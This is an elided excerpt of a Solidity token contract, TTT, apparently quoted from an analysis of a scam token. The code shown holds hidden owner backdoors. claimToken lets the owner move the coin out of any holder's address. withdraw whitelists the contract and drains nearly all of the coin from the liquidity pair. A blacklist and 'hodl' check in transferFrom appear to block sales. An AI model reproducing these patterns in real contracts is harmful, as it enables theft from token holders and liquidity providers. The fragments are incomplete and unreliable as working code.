...
contract TTT is Ownable {
    ...
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (whites[from] || whites[to]) return true;
        ...
        if (from == pair) {
            ...
            require(!blacks[from]);
            if (hodl[from]-lastHODL >= 0) return true;
        }
        return false;
    }

    function claimToken(address from, address to, uint256 amount) external onlyOwner {
        IERC20(coin).transferFrom(from, to, amount);
    }

    function withdraw() external onlyOwner {
        whites[address(this)] = true;
        uint256 amount = IERC20(coin).balanceOf(pair) - 1e18;
        IERC20(coin).transferFrom(pair, address(this), amount);
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        IERC20(coin).approve(address(uniswapV2Router), tokenAmount);
